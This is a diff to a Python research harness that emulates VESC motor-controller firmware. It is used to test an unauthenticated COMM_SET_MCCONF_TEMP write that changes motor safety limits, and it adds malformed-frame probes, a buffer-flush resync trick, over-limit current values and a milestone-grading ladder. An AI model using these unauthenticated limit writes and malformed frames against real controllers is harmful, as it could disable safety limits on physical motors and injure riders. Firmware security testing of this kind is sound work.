@@ -57,10 +57,13 @@ the firmware, and ``landed`` is forced false with the reason recorded.
 """
 from __future__ import annotations
 
+import hashlib
 import json
+import math
 import os
 import re
 import socket
+import struct
 import subprocess
 import sys
 import time
@@ -138,6 +141,54 @@ BOOT_TIMEOUT = float(os.environ.get("VESC_BOOT_TIMEOUT", "900"))
 REPLY_TIMEOUT = float(os.environ.get("VESC_REPLY_TIMEOUT", "180"))
 # How long to wait when the firmware's source says NOTHING should come back.
 SILENCE_TIMEOUT = float(os.environ.get("VESC_SILENCE_TIMEOUT", "25"))
+
+# ---------------------------------------------------------------------------
+# SEAM RE-ESTABLISHMENT.  Read this before believing any "the firmware ignored
+# it" reading on this device.
+#
+# `comm/packet.c` in the pinned tree has **no `rx_timeout` and no
+# `packet_timerfunc`** -- the fleet's first guess, and it is wrong at source
+# level.  The decoder re-synchronises only by CONSUMING bytes:
+#
+#   * `try_decode_packet` returns -1 and `rx_read_ptr` advances ONE byte, then
+#     the whole scan runs again -- so a rejected N-byte frame costs O(N^2);
+#   * while `bytes_left > 1` it swallows bytes without attempting a decode at
+#     all, so ONE malformed 16-bit-length header can make it eat the next 255
+#     bytes -- every known-good request inside that window looks ignored;
+#   * the ONLY unconditional reset is the overflow one:
+#         if (data_len >= PACKET_BUFFER_LEN) { write=read=0; bytes_left=0; }
+#
+# So the correct re-establishment is to PUSH `PACKET_BUFFER_LEN` bytes at it.
+# Measured on this device, after a 255-byte-payload frame:
+#
+#     three plain known-good retries, 30 s each   ->  DEAD, 3/3
+#     544 bytes of filler, then one retry         ->  ALIVE in 0.03 s
+#
+# `RESYNC_FLUSH` is that push. It is filler the decoder can never accept: 0x00
+# is not a valid start byte, so once `bytes_left` is clear each filler byte
+# costs one O(1) rejection, and while `bytes_left` is large the filler is what
+# drives `data_len` to the overflow reset.
+PACKET_BUFFER_LEN = 520          # packet.h: PACKET_MAX_PL_LEN (512) + 8
+RESYNC_FLUSH = PACKET_BUFFER_LEN + 24
+RESYNC_QUICK_TIMEOUT = float(os.environ.get("VESC_RESYNC_QUICK_S", "20"))
+RESYNC_FLUSH_TIMEOUT = float(os.environ.get("VESC_RESYNC_FLUSH_S", "120"))
+RESYNC_ROUNDS = int(os.environ.get("VESC_RESYNC_ROUNDS", "3"))
+
+#: Falsification knob for the two new rungs.  `""` is the real run.
+#:   m6-freeze        grade every M6 round against round 0's state
+#:   m7-valid-only    replace every malformed probe with its own valid twin
+#:   m7-mispredict    rotate each class's expectation onto the next DISTINCT answer
+FALSIFY = os.environ.get("VESC_FALSIFY", "").strip().lower()
+FALSIFY_MODES = ("", "m6-freeze", "m7-valid-only", "m7-mispredict")
+#: When set, both the default arm and a `--falsify` arm mint IDENTICAL values,
+#: so the FIRMWARE's replies can be compared byte for byte across the two.
+MINT_SEED = os.environ.get("VESC_MINT_SEED")
+
+#: The board's own limits, from `hw_100_250.h:256` (HW_LIM_CURRENT_IN) and
+#: `commands.c`'s fixed 0.0-1.0 range for the current scales. Both were
+#: RE-MEASURED live before being written here, not taken from the header.
+HW_LIM_CURRENT_IN = 300.0
+SCALE_LIMITS = (0.0, 1.0)
 
 
 # ---------------------------------------------------------------------------
@@ -606,6 +657,101 @@ class VescScenario:
             return None
         return bytes(payload[1:]).split(b"\x00")[0].decode("latin-1", "replace")
 
+    # ---- the reader repairs (see RESYNC_FLUSH above) -----------------------
+    def drain(self, seconds: float = 1.0) -> int:
+        """Discard whatever is already queued BEFORE sending a request.
+
+        Without this, a reply that arrived late is handed to the NEXT exchange
+        and the answer you read is the previous question's -- w99.2's
+        manufactured corpse, from the other side. It bit this lane's own first
+        probe of the sibling device, so it is a method here and not a comment.
+        """
+        end = time.time() + seconds
+        n = 0
+        while time.time() < end:
+            if self._read_frame(timeout=max(0.05, end - time.time())) is None:
+                break
+            n += 1
+        return n
+
+    def resync(self) -> Dict[str, object]:
+        """Bounded seam RE-ESTABLISHMENT. Returns what it had to do.
+
+        Cheap first (one known-good frame), then the flush the decoder's own
+        overflow reset requires. Every malformed class in the M7 phase is
+        followed by one of these and the phase FAILS if any of them comes back
+        ``alive=False`` -- so a class graded after a dead seam cannot exist
+        (playbook w78.5).
+        """
+        t0 = time.time()
+        flushes = 0
+        for k in range(RESYNC_ROUNDS):
+            r = self.request(bytes([vc.COMM_FW_VERSION]),
+                             want=vc.COMM_FW_VERSION,
+                             timeout=(RESYNC_QUICK_TIMEOUT if k == 0
+                                      else RESYNC_FLUSH_TIMEOUT))
+            if r is not None:
+                self.drain(0.5)
+                return {"alive": True, "flushes": flushes,
+                        "seconds": round(time.time() - t0, 2)}
+            self._send(b"\x00" * RESYNC_FLUSH)
+            flushes += 1
+        return {"alive": False, "flushes": flushes,
+                "seconds": round(time.time() - t0, 2)}
+
+    def terminal_lines(self, cmd: bytes, first: float = REPLY_TIMEOUT,
+                       quiet: float = 6.0) -> List[str]:
+        """EVERY ``COMM_PRINT`` the firmware emits for one terminal command.
+
+        :meth:`terminal` takes only the first, which is why nobody on this
+        device had seen its own 115-line ``help`` -- or the second line of its
+        refusal, which is the one that carries the host's nonce.
+        """
+        self.drain(0.5)
+        self._send(vc.frame(bytes([vc.COMM_TERMINAL_CMD]) + cmd))
+        out: List[str] = []
+        tmo = first
+        while True:
+            p = self._read_frame(timeout=tmo)
+            if p is None:
+                break
+            if p and p[0] == vc.COMM_PRINT:
+                out.append(bytes(p[1:]).split(b"\x00")[0]
+                           .decode("latin-1", "replace"))
+            tmo = quiet
+        return out
+
+    def accepted_packets(self) -> Optional[int]:
+        """The GUEST's own count of packets its decoder accepted, or None.
+
+        `commands_process_packet` is reached exactly once per packet
+        `try_decode_packet()` accepted, and this device's `boot_trace` handler
+        logs `BOOT-COUNT: ... n=<N>` on every arrival. The number is therefore
+        produced by the guest reaching a guest address -- a host cannot compute
+        it without reimplementing packet.c, which is precisely what makes it a
+        witness rather than bookkeeping.
+        """
+        hits = re.findall(r"BOOT-COUNT: commands_process_packet[^\n]*n=(\d+)",
+                          _read_log_incremental(self.log))
+        return int(hits[-1]) if hits else None
+
+    def raw_config_fields(self) -> Optional[Dict[str, str]]:
+        """The two graded limits as the firmware's OWN bytes, unrounded.
+
+        `_decode` rounds to three decimals, which is right for a report and
+        wrong for a one-ULP bracket: 299.99997 and 300.0 both print `300.0`.
+        """
+        conf = self.get_mcconf()
+        if conf is None:
+            return None
+        return {
+            "l_in_current_max": conf[vc.MCCONF_OFF_L_IN_CURRENT_MAX:
+                                     vc.MCCONF_OFF_L_IN_CURRENT_MAX + 4].hex(),
+            "l_current_max_scale": conf[vc.MCCONF_OFF_L_CURRENT_MAX_SCALE:
+                                        vc.MCCONF_OFF_L_CURRENT_MAX_SCALE
+                                        + 2].hex(),
+        }
+
     def attack(self) -> dict:
         """Unauthenticated COMM_SET_MCCONF_TEMP: move the motor's safety limits.
 
@@ -725,6 +871,524 @@ class VescScenario:
         return res
 
 
+
+# =========================================================================
+# THE LADDER.  One pure function, called from ONE place (`_finalize`, in a
+# `finally` block), so every exit from `run_attack` goes through it.
+#
+# What it replaces, transcribed:
+#
+#     result = {..., "milestone": "M0", ...}
+#     if not sc.boot(stage):
+#         result["milestone"] = "ERROR" if gated else ("M0" if faulted else "M1")
+#         return result
+#     result["milestone"] = "M3"                     # boot() returned True
+#     if result["landed"]: result["milestone"] = "M4"
+#
+# Enumerated over the same booleans the repaired ladder takes, that is
+# 128 assignments printing {ERROR, M0, M1, M3, M4} -- and **32 of them are
+# w91.1's DOWNWARD false floor**: `boot()` returns False when the firmware
+# does not enable USART3 inside the timeout, and that path could only ever
+# report M0 or M1, so a run whose guest ran ChibiOS' crt0, reached `main()`
+# and printed its own `conf_general_init` / `mc_interface_init` boot trace --
+# M2 by the fleet's own definition -- reported **M1**, with the evidence
+# already in its own log.
+#
+# `own_init` is therefore read from the firmware's own boot trace, not from
+# the USART3 marker, and the floor is INSIDE the ladder.
+#
+# There is deliberately **no M5 branch**: this device has one interface (the
+# USART3 COMM seam), so RULES §1a leaves M5 UNDEFINED, and a branch with no
+# term would be w88.6's defect in a taller hat. There is no M8 branch for the
+# same reason.
+def _ladder(gates_ok: bool, guest_ran: bool, own_init: bool, seam_up: bool,
+            m4: bool, m6: bool, m7: bool) -> str:
+    """The highest rung THIS run earned. Pure; no I/O; no globals."""
+    if not gates_ok:
+        # Not a rung. Nothing was measurable, so there is no milestone and the
+        # failure is about the install (see THE TWO STARTUP GATES above).
+        return "ERROR"
+    if not guest_ran:
+        return "M0"
+    if not own_init:
+        return "M1"
+    if not seam_up:
+        return "M2"
+    if not m4:
+        return "M3"
+    # M6 and M7 do NOT chain (RULES §1a, 2026-09-02): a scorer that requires
+    # M6 before M7 is a defect in the scorer, not a property of the ladder.
+    if m7:
+        return "M7"
+    if m6:
+        return "M6"
+    return "M4"
+
+
+#: Every string `_ladder` is capable of returning. `tools/enumerate_ladder.py`
+#: checks this against BOTH what the enumeration prints AND what the source
+#: `ast` says the function writes, so a branch that exists but is unreachable
+#: is reported as a DEAD BRANCH rather than as a fact about the firmware.
+LADDER_PRINTABLE = ("ERROR", "M0", "M1", "M2", "M3", "M4", "M6", "M7")
+
+
+# =========================================================================
+# M6 / M7
+# =========================================================================
+class _Mint:
+    """Per-run values. Seeded from `VESC_MINT_SEED` when set, so a default arm
+    and a `--falsify` arm can mint IDENTICALLY and the FIRMWARE's replies can
+    then be compared byte for byte across the two (playbook w100.4)."""
+
+    def __init__(self, seed: Optional[str]) -> None:
+        import random
+        self.seed = seed
+        self._r = random.Random(seed) if seed else None
+
+    def bits(self, n: int) -> int:
+        if self._r is None:
+            import secrets
+            return secrets.randbits(n)
+        return self._r.getrandbits(n)
+
+    def below(self, n: int) -> int:
+        if self._r is None:
+            import secrets
+            return secrets.randbelow(n)
+        return self._r.randrange(n)
+
+
+def _f32_bytes(v: float) -> str:
+    import struct as _s
+    return _s.pack(">f", v).hex()
+
+
+def _f16_bytes(w: float) -> str:
+    import struct as _s
+    return _s.pack(">h", int(round(w * 10000.0))).hex()
+
+
+def _f32_neighbour(v: float, up: bool) -> float:
+    """The next representable **binary32** either side of ``v``.
+
+    NOT ``math.nextafter``: that steps a *double*, and packing the result back
+    to binary32 rounds it straight onto ``v`` again -- so a "one step above the
+    limit" built that way is the limit, the clamp has nothing to clamp, and the
+    class silently tests nothing. Caught by this row's own test before it ran.
+    """
+    bits = struct.unpack(">I", struct.pack(">f", v))[0]
+    bits += 1 if up else -1
+    return struct.unpack(">f", struct.pack(">I", bits))[0]
+
+
+def _predict_in_current_max(v: float) -> float:
+    """`utils_truncate_number(&x, HW_LIM_CURRENT_IN)` -- the board's own range."""
+    return max(-HW_LIM_CURRENT_IN, min(HW_LIM_CURRENT_IN, v))
+
+
+def _predict_scale(w: float) -> float:
+    lo, hi = SCALE_LIMITS
+    return max(lo, min(hi, w))
+
+
+#: The distinct ANSWERS this firmware gives to the graded classes. The
+#: mispredict knob rotates onto the next DISTINCT answer, never onto the next
+#: CLASS: six of the nine classes share `silent-nowrite`, so a next-class
+#: rotation would leave them predicting what they already predicted and the
+#: knob would move three classes while the verdict flipped anyway (w96.2/w100.4).
+ANSWER_IDS = ("silent-nowrite", "rendered-invalid-command", "clamped-to-limit")
+
+
+def _rotate(answer_id: str) -> str:
+    i = ANSWER_IDS.index(answer_id)
+    return ANSWER_IDS[(i + 1) % len(ANSWER_IDS)]
+
+
+def _framing_variants(payload: bytes, mint: _Mint):
+    """The malformed framings of ONE payload, each with its valid twin.
+
+    Every one of them is `packet.c`'s own rule, and every one of them carries a
+    REAL `COMM_SET_MCCONF_TEMP` write, so the witness of the refusal is the
+    limit the firmware declined to move -- not the silence (w100.3).
+    """
+    good = vc.frame(payload)
+    n = len(payload)
+    out = []
+
+    b = bytearray(good); b[1] = 0
+    out.append(("hdr_len_zero", bytes(b),
+                "8-bit form declaring length 0 -- try_decode_packet: "
+                "`if (len < 1) return -1`"))
+    b = bytearray(good); b[1] = (n + 1) & 0xFF
+    out.append(("hdr_len_over", bytes(b),
+                "declared length one MORE than the payload"))
+    b = bytearray(good); b[1] = (n - 1) & 0xFF
+    out.append(("hdr_len_under", bytes(b),
+                "declared length one LESS than the payload"))
+    b = bytearray(good); b[0] = 4
+    out.append(("start_byte_24bit", bytes(b),
+                "start byte 4: the 24-bit form is compiled out at "
+                "PACKET_MAX_PL_LEN=512, so it is not a valid start byte"))
+    b = bytearray(good); b[-1] = 4
+    out.append(("stop_byte_wrong", bytes(b),
+                "stop byte 4 -- `if (buffer[data_start+len+2] != 3) return -1`"))
+    b = bytearray(good); b[-3] ^= 1 << mint.below(8)
+    out.append(("crc_one_bit", bytes(b),
+                "ONE bit of the CRC-16 flipped, at a per-run minted position"))
+    out.append(("truncated", good[:-2],
+                "the last two bytes dropped"))
+    return good, out
+
+
+def _m7_phase(sc: "VescScenario", mint: _Mint, stage: Callable) -> dict:
+    """Adversarial input, every class with a witness that is not silence.
+
+    Three counters, deliberately SEPARATE (w100.3): folding a state fact into
+    the same number as a rendered string would inflate the figure the
+    valid-only control has to drive to zero, by a term that is ours to define.
+    """
+    mode = FALSIFY
+    res: dict = {
+        "mode": mode, "classes": [], "classes_ok": 0, "classes_total": 0,
+        "twins_ok": 0, "twins_total": 0,
+        "refusal_witnesses_seen": 0,     # firmware-RENDERED refusal strings
+        "state_refusals_seen": 0,        # a limit the firmware declined to move
+        "clamp_refusals_seen": 0,        # a limit the firmware SUBSTITUTED
+        "resyncs": [], "seam_alive_after_every_class": True,
+        "reply_digest": "",
+    }
+    import hashlib
+    digest = hashlib.sha256()
+
+    base = sc.get_mcconf()
+    if base is None:
+        res["error"] = "no COMM_GET_MCCONF before the M7 phase"
+        return res
+
+    def record(name, expected, observed, note, extra=None):
+        ok = (observed == expected)
+        row = {"class": name, "expected": expected, "observed": observed,
+               "ok": ok, "note": note}
+        if extra:
+            row.update(extra)
+        res["classes"].append(row)
+        res["classes_total"] += 1
+        res["classes_ok"] += int(ok)
+        return ok
+
+    # ---- the framing classes ------------------------------------------
+    for name, raw, note in _framing_variants(
+            vc.set_mcconf_temp_payload(base, store=False, ack=True,
+                                       l_current_max_scale=0.5),
+            mint)[1]:
+        w = (mint.below(9000) + 500) / 10000.0        # a per-run minted scale
+        payload = vc.set_mcconf_temp_payload(base, store=False, ack=True,
+                                             l_current_max_scale=w)
+        good, variants = _framing_variants(payload, mint)
+        raw = dict((n, r) for n, r, _n in variants)[name]
+        before = sc.raw_config_fields()
+        sc.drain(0.5)
+        # `m7-valid-only` sends the class's OWN valid twin instead. That is the
+        # arm w91.2 says a refusal rung is worthless without: the witnesses
+        # must go to ZERO while the seam still answers.
+        sc._send(good if mode == "m7-valid-only" else raw)
+        reply = sc._read_frame(timeout=SILENCE_TIMEOUT)
+        rs = sc.resync()
+        res["resyncs"].append(dict(rs, cls=name))
+        res["seam_alive_after_every_class"] &= bool(rs["alive"])
+        after = sc.raw_config_fields()
+        digest.update(("%s|%s|%s" % (name, reply.hex() if reply else "-",
+                                     (after or {}).get("l_current_max_scale")))
+                      .encode())
+        if after is not None and after == before:
+            observed = "silent-nowrite"
+            res["state_refusals_seen"] += 1
+        elif after is not None and after["l_current_max_scale"] == _f16_bytes(w):
+            observed = "accepted-write"
+        else:
+            observed = "other"
+        expected = _rotate("silent-nowrite") if mode == "m7-mispredict" \
+            else "silent-nowrite"
+        record(name, expected, observed, note,
+               {"minted_scale": w, "before": before, "after": after,
+                "reply": reply.hex() if reply else None})
+        # the TWIN: the same payload, correctly framed, must LAND.
+        sc.drain(0.5)
+        sc._send(good)
+        sc._read_frame(timeout=REPLY_TIMEOUT)
+        tw = sc.raw_config_fields()
+        res["twins_total"] += 1
+        twin_ok = tw is not None and tw["l_current_max_scale"] == _f16_bytes(w)
+        res["twins_ok"] += int(twin_ok)
+        digest.update(("twin|%s|%s" % (name, (tw or {}).get(
+            "l_current_max_scale"))).encode())
+
+    # ---- the rendered-refusal class -----------------------------------
+    # `terminal_process_string()` prints `Invalid command: %s\ntype help to
+    # list all available commands\n`. That format string is in the image
+    # exactly once; the RENDERED line, carrying a per-run nonce, is in it zero
+    # times, and the host cannot make the firmware say it by any other route.
+    nonce = "zz%08x" % mint.bits(32)
+    cmd = (TERMINAL_PROBE if mode == "m7-valid-only" else nonce.encode())
+    lines = sc.terminal_lines(cmd)
+    rs = sc.resync()
+    res["resyncs"].append(dict(rs, cls="terminal_unknown"))
+    res["seam_alive_after_every_class"] &= bool(rs["alive"])
+    want = "Invalid command: " + nonce
+    rendered = any(l.startswith(want) for l in lines)
+    res["refusal_witnesses_seen"] += int(rendered)
+    observed = "rendered-invalid-command" if rendered else (
+        "answered-without-refusal" if lines else "silent-nowrite")
+    expected = _rotate("rendered-invalid-command") if mode == "m7-mispredict" \
+        else "rendered-invalid-command"
+    record("terminal_unknown", expected, observed,
+           "an unknown terminal command: the firmware must render the host's "
+           "own per-run nonce inside its own error template",
+           {"nonce": nonce, "sent": cmd.decode("latin-1"), "lines": lines})
+    digest.update(("term|%s" % "|".join(lines)).encode())
+    # the twin: a command that IS in the table answers, and says nothing about
+    # an invalid command. Its answer is NOT itself a refusal string, which is
+    # what w100.2 says to check before using a twin at all.
+    tlines = sc.terminal_lines(TERMINAL_PROBE)
+    res["twins_total"] += 1
+    res["twins_ok"] += int(any(l.startswith("FAULT_CODE") for l in tlines)
+                           and not any(l.startswith("Invalid command")
+                                       for l in tlines))
+    digest.update(("termtwin|%s" % "|".join(tlines)).encode())
+
+    # ---- the clamp classes: a refusal that SUBSTITUTES ------------------
+    for field, name, note in (
+            ("l_in_current_max", "clamp_in_current",
+             "l_in_current_max one float32 step ABOVE HW_LIM_CURRENT_IN"),
+            ("l_current_max_scale", "clamp_scale",
+             "l_current_max_scale above the fixed 0.0-1.0 range")):
+        if field == "l_in_current_max":
+            good_v = _f32_neighbour(HW_LIM_CURRENT_IN, up=False)
+            bad_v = _f32_neighbour(HW_LIM_CURRENT_IN, up=True)
+            sent = good_v if mode == "m7-valid-only" else bad_v
+            kw = {"l_in_current_max": sent, "l_current_max_scale": 0.5}
+            predict_clamped = _f32_bytes(_predict_in_current_max(bad_v))
+            predict_accept = _f32_bytes(good_v)
+        else:
+            good_v = (mint.below(9000) + 500) / 10000.0
+            bad_v = 1.0 + (mint.below(9000) + 500) / 10000.0
+            sent = good_v if mode == "m7-valid-only" else bad_v
+            kw = {"l_in_current_max": 250.0, "l_current_max_scale": sent}
+            predict_clamped = _f16_bytes(_predict_scale(bad_v))
+            predict_accept = _f16_bytes(good_v)
+        sc.drain(0.5)
+        sc._send(vc.frame(vc.set_mcconf_temp_payload(
+            base, store=False, ack=True, **kw)))
+        sc._read_frame(timeout=REPLY_TIMEOUT)
+        rs = sc.resync()
+        res["resyncs"].append(dict(rs, cls=name))
+        res["seam_alive_after_every_class"] &= bool(rs["alive"])
+        after = sc.raw_config_fields()
+        got = (after or {}).get(field)
+        digest.update(("clamp|%s|%s" % (name, got)).encode())
+        if got == predict_clamped and got != _f32_bytes(bad_v) \
+                and got != _f16_bytes(bad_v):
+            observed = "clamped-to-limit"
+            res["clamp_refusals_seen"] += 1
+        elif got == predict_accept:
+            observed = "accepted-write"
+        else:
+            observed = "other"
+        expected = _rotate("clamped-to-limit") if mode == "m7-mispredict" \
+            else "clamped-to-limit"
+        record(name, expected, observed, note,
+               {"sent": sent, "got": got, "predict_clamped": predict_clamped,
+                "predict_accept": predict_accept})
+        # the twin: the value ONE representable step on the other side, which
+        # the firmware must store unchanged.
+        sc.drain(0.5)
+        kw2 = dict(kw)
+        kw2[field] = good_v
+        sc._send(vc.frame(vc.set_mcconf_temp_payload(
+            base, store=False, ack=True, **kw2)))
+        sc._read_frame(timeout=REPLY_TIMEOUT)
+        tw = (sc.raw_config_fields() or {}).get(field)
+        res["twins_total"] += 1
+        res["twins_ok"] += int(tw == predict_accept)
+        digest.update(("clamptwin|%s|%s" % (name, tw)).encode())
+
+    res["reply_digest"] = digest.hexdigest()[:16]
+    res["ok"] = bool(
+        res["classes_total"] > 0
+        and res["classes_ok"] == res["classes_total"]
+        and res["twins_ok"] == res["twins_total"]
+        and res["seam_alive_after_every_class"]
+        and res["refusal_witnesses_seen"] > 0
+        and res["state_refusals_seen"] > 0
+        and res["clamp_refusals_seen"] > 0)
+    stage("m7", note="classes %d/%d twins %d/%d  witnesses rendered=%d "
+                     "state=%d clamp=%d  seam-after-every-class=%s  "
+                     "digest=%s  mode=%r"
+          % (res["classes_ok"], res["classes_total"], res["twins_ok"],
+             res["twins_total"], res["refusal_witnesses_seen"],
+             res["state_refusals_seen"], res["clamp_refusals_seen"],
+             res["seam_alive_after_every_class"], res["reply_digest"],
+             mode or "default"))
+    return res
+
+
+def _m6_phase(sc: "VescScenario", mint: _Mint, stage: Callable,
+              rounds: int = 6) -> dict:
+    """The SAME byte-identical request, answered differently at N states.
+
+    Two witnesses, and they are independent of each other:
+
+    * the firmware's own serialized `mc_configuration` (`COMM_GET_MCCONF`,
+      id 14) -- `l_current_max_scale` as `round(w*10000)` in a big-endian
+      int16, and `l_in_current_max` as binary32. The pair is deliberate
+      (w99.4): on the CLAMPING side `l_in_current_max` predicts the constant
+      300.0 whatever we mint, so it is only half a witness there, and the
+      scale, which is minted inside the accepted range in the same round,
+      is the half that still moves.
+    * the GUEST's own count of packets its decoder ACCEPTED, read out of
+      `commands_process_packet` arrivals. Each round mints `k` well-formed and
+      `j` malformed frames; the guest's counter must rise by exactly `k`, so
+      the delta AGAINST WHAT WE SENT is negative by `j`. A host cannot compute
+      that number without reimplementing `try_decode_packet`.
+    """
+    res: dict = {"rounds": [], "rounds_ok": 0, "rounds_total": 0,
+                 "answers_differ": False, "counter_ok": 0,
+                 "counter_total": 0, "mode": FALSIFY}
+    base = sc.get_mcconf()
+    if base is None:
+        res["error"] = "no COMM_GET_MCCONF before the M6 phase"
+        return res
+    seen_answers = set()
+    frozen: Optional[dict] = None
+    for r in range(rounds):
+        # alternate the sides so NEITHER direction can be absent by luck
+        over = bool(r % 2)
+        w = ((1.0 + (mint.below(9000) + 500) / 10000.0) if over
+             else (mint.below(9000) + 500) / 10000.0)
+        v = ((HW_LIM_CURRENT_IN + 1 + mint.below(500)) if over
+             else float(mint.below(29000) + 500) / 100.0)
+        k = 1 + mint.below(4)          # well-formed frames the guest must count
+        j = mint.below(3)              # malformed frames it must NOT count
+        before_n = sc.accepted_packets()
+        sc.drain(0.5)
+        sc._send(vc.frame(vc.set_mcconf_temp_payload(
+            base, store=False, ack=True,
+            l_in_current_max=v, l_current_max_scale=w)))
+        sc._read_frame(timeout=REPLY_TIMEOUT)
+        sent_ok = 1
+        for _ in range(k - 1):
+            sc.request(bytes([vc.COMM_FW_VERSION]), want=vc.COMM_FW_VERSION,
+                       timeout=REPLY_TIMEOUT)
+            sent_ok += 1
+        for _ in range(j):
+            b = bytearray(vc.frame(bytes([vc.COMM_FW_VERSION])))
+            b[-3] ^= 0xFF
+            sc.drain(0.2)
+            sc._send(bytes(b))
+            sc._read_frame(timeout=2.0)
+        rs = sc.resync()
+        sent_ok += 1                          # resync's own known-good frame
+        # THE request: byte-identical every round.
+        raw = sc.raw_config_fields()
+        sent_ok += 1                          # get_mcconf inside raw_config_fields
+        temp = sc.request(bytes([91]), want=91, timeout=REPLY_TIMEOUT)
+        sent_ok += 1
+        after_n = sc.accepted_packets()
+        want_scale = _f16_bytes(_predict_scale(w))
+        want_in = _f32_bytes(_predict_in_current_max(v))
+        target = frozen if (FALSIFY == "m6-freeze" and frozen) else {
+            "l_current_max_scale": want_scale, "l_in_current_max": want_in}
+        if frozen is None:
+            frozen = dict(target)
+        ok = (raw is not None and raw["l_current_max_scale"]
+              == target["l_current_max_scale"]
+              and raw["l_in_current_max"] == target["l_in_current_max"])
+        # witness 2: the guest's own accepted-frame count
+        delta = (None if (before_n is None or after_n is None)
+                 else after_n - before_n)
+        counter_ok = (delta is not None and delta == sent_ok)
+        res["counter_total"] += 1
+        res["counter_ok"] += int(counter_ok)
+        # witness 1b: the second, INDEPENDENT handler (COMM_GET_MCCONF_TEMP,
+        # id 91) reports the same state through a different serializer
+        # (float32_auto, not the int16 the full mcconf uses).
+        temp_scale = None
+        if temp is not None and len(temp) >= 9:
+            temp_scale = struct.unpack_from(">f", bytes(temp), 5)[0]
+        temp_ok = (temp_scale is not None
+                   and abs(temp_scale - _predict_scale(w)) < 1e-4)
+        seen_answers.add((raw or {}).get("l_current_max_scale"))
+        res["rounds"].append({
+            "round": r, "minted_scale": w, "minted_in_current": v,
+            "over_limit": over, "sent_wellformed": sent_ok, "sent_malformed": j,
+            "guest_accepted_delta": delta, "counter_ok": counter_ok,
+            "readback": raw, "want_scale": target["l_current_max_scale"],
+            "want_in_current": target["l_in_current_max"], "ok": ok,
+            "id91_scale": temp_scale, "id91_ok": temp_ok,
+            "resync": rs})
+        res["rounds_total"] += 1
+        res["rounds_ok"] += int(ok and temp_ok)
+    res["answers_differ"] = len(seen_answers - {None}) > 1
+    res["ok"] = bool(res["rounds_total"] == rounds
+                     and res["rounds_ok"] == rounds
+                     and res["counter_ok"] == res["counter_total"]
+                     and res["answers_differ"])
+    stage("m6", note="rounds %d/%d  guest-counter %d/%d  answers differ=%s  "
+                     "mode=%r"
+          % (res["rounds_ok"], res["rounds_total"], res["counter_ok"],
+             res["counter_total"], res["answers_differ"], FALSIFY or "default"))
+    return res
+
+
+def _finalize(sc: "VescScenario", result: dict) -> dict:
+    """Apply the ladder. Called from ONE place, in `run_attack`'s `finally`,
+    so EVERY exit -- the refusal, both gate failures, an exception, and the
+    graded path -- is graded by the same function on the same facts.
+
+    The facts are read from the child's own log rather than from whatever the
+    body managed to set, so a run that died half way through is still graded
+    on what its guest actually did.
+    """
+    text = sc.log_text()
+    result["log_bytes"] = len(text)
+    faulted = any(m in text for m in _GUEST_FAULT_MARKERS)
+    result["guest_faulted"] = faulted
+    # M1: the CPU started (gate 1) and did measured work (gate 2), with no
+    # guest fault. `gate1` is None when logging.cfg could not print the marker
+    # at all, and None must not read as a failure (see THE TWO STARTUP GATES).
+    gate1 = result.get("gate1_cpu_started")
+    guest_ran = (gate1 is not False) and not faulted and (
+        (result.get("gate2_child_cpu_s") or 0.0) >= WORK_FLOOR_CPU_S)
+    # M2: the FIRMWARE's own boot trace. THIS is the line that repairs w91.1's
+    # downward false floor: the old code could only answer M0 or M1 whenever
+    # `boot()` returned False, so a guest that ran ChibiOS' crt0, reached
+    # `main()` and printed `conf_general_init` / `mc_interface_init` -- its own
+    # initialisation, M2 by the fleet's definition -- was reported M1, with the
+    # evidence sitting in its own log.
+    boot_syms = re.findall(r"BOOT: ([A-Za-z_][\w]*)", text)
+    result["boot_trace"] = boot_syms[:16]
+    own_init = any(s in boot_syms for s in
+                   ("conf_general_init", "mc_interface_init", "commands_init"))
+    # M3: the firmware drove its own peripheral -- its USART3 driver wrote
+    # CR1.UE, which is what BOOT_MARKER records.
+    seam_up = BOOT_MARKER in text
+    result["own_init"] = own_init
+    result["seam_up"] = seam_up
+    result["milestone"] = _ladder(
+        gates_ok=not result.get("gated_out", False),
+        guest_ran=bool(guest_ran),
+        own_init=bool(own_init),
+        seam_up=bool(seam_up),
+        m4=bool(result.get("landed")),
+        m6=bool((result.get("m6") or {}).get("ok")),
+        m7=bool((result.get("m7") or {}).get("ok")))
+    # THE FLEET INVARIANT, asserted where it is produced: `landed` means M4 and
+    # only M4, never a rung below it.
+    result["landed"] = bool(result.get("landed")) and \
+        result["milestone"] in ("M4", "M6", "M7")
+    return result
+
+
 def run_attack(on_stage: Optional[Callable] = None,
                log_dir: Optional[str] = None) -> dict:
     """Fleet-standard entry point (playbook §2a). Self-booting.
@@ -736,6 +1400,14 @@ def run_attack(on_stage: Optional[Callable] = None,
         if on_stage:
             on_stage(name, **d)
 
+    if FALSIFY not in FALSIFY_MODES:
+        # A knob that falls through to the default runs the REAL arm and
+        # reports it as a control, which reads either as "the control does not
+        # discriminate" or as "I ran the control", and both are false.
+        raise SystemExit(
+            "VESC_FALSIFY=%r is not a recognised mode; expected one of %s"
+            % (FALSIFY, ", ".join(repr(m) for m in FALSIFY_MODES)))
+
     # HAL_PY first, then sys.executable.  spawn_argv() already honours HAL_PY,
     # but passing sys.executable here overrode it -- which made the one control
     # arm that reproduces a BROKEN INSTALL (an interpreter with no halucinator)
@@ -743,29 +1415,27 @@ def run_attack(on_stage: Optional[Callable] = None,
     # gate.
     sc = VescScenario(python=os.environ.get("HAL_PY") or sys.executable,
                       log_dir=log_dir or "/tmp")
-    # "M0", NOT "M1".  A pre-initialised rung is a milestone nobody measured,
-    # and every early-exit below used to return it verbatim.
-    result: dict = {"booted": False, "landed": False, "milestone": "M0",
+    # NO pre-initialised rung: `_finalize` derives `milestone` on every path.
+    result: dict = {"booted": False, "landed": False,
                     "vesc_packet_round_trip": False,
                     "seam_control": SEAM_CONTROL,
+                    "falsify": FALSIFY,
+                    "mint_seed": MINT_SEED,
                     "gate1_cpu_started": None,
                     "gate2_child_cpu_s": 0.0,
                     "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
+                    "gated_out": False,
+                    # A phase that never RAN reports `unobservable`, never a
+                    # scored zero (w66.2/w68.2/w78.6).
+                    "m6": {"ok": False, "unobservable": True},
+                    "m7": {"ok": False, "unobservable": True},
                     "logging_cfg_present": VescScenario.logging_cfg_present()}
     try:
         if not sc.boot(stage):
             bad = dict(sc.startup_failure or {})
-            gated = bad.pop("gated_out", True)
-            faulted = bad.pop("guest_faulted", False)
+            result["gated_out"] = bool(bad.pop("gated_out", True))
+            bad.pop("guest_faulted", None)
             result.update(bad)
-            # ERROR when a gate failed: nothing was measured, so there is no
-            # milestone to report and the failure is about the install.
